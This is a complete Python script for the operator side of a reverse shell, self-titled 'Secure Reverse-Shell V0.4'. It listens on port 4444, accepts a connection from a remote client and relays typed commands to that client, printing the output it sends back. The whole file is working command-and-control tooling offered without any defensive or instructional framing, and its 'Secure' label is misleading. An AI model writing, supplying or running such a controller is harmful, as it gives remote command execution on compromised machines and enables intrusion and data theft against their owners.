import socket

def recv_response(sock):
    try:
        size_header = sock.recv(64).decode('utf-8').strip()
        if not size_header:
            return None 
        data_size = int(size_header)

        sock.send(b'OK_SIZE')

    except (ValueError, socket.error):
        print('[!] Data transmission protocol error')
        return None

    data = b''
    bytes_received = 0 
    while bytes_received < data_size:
        chunk = sock.recv(min(4096, data_size - bytes_received))
        if not chunk:
            break
        data += chunk
        bytes_received += len(chunk)
    
    return data.decode('utf-8')

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 4444))
server.listen(1)
server.settimeout(60)
print('=' * 18, "\nSecure Reverse-Shell V0.4",)
print('=' * 18)
print('[*] Wait connection...')

try:
    conn, addr = server.accept()
    print(f'[+] Connection by {addr}')

    while True:

        cmd = input('Command~$ ')
        if not cmd.strip():
            continue  

        conn.send(cmd.encode('utf-8'))
        if cmd.lower() == 'exit':
            break

        output = recv_response(conn)
        if output is None:
            print('[!] Сlient terminated connection')
            break
        print(output)

except socket.timeout:
    print("[!] Can't connect to client, please try again")
finally:
    print('[!] Connection closed')
    server.close()
    input('[*] Press Enter to exit...')
